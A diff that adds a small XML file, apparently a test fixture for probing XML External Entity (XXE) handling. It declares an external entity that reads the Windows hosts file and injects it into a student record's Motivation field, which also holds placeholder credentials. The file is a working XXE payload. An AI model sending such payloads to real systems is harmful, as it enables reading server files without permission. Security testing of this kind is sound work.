@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Students
+[
+<!ENTITY xxe SYSTEM "C:\Windows\System32\drivers\etc\hosts">
+]
+>
+<Students>
+	<Student>
+		<Email>d@d.com</Email>
+		<LastnameFirstname>XXE test user</LastnameFirstname>
+		<Password>azertyuiop</Password>
+		<!-- Insert XXE into this field -->
+		<Motivation>&xxe;</Motivation>
+	</Student>
+</Students>
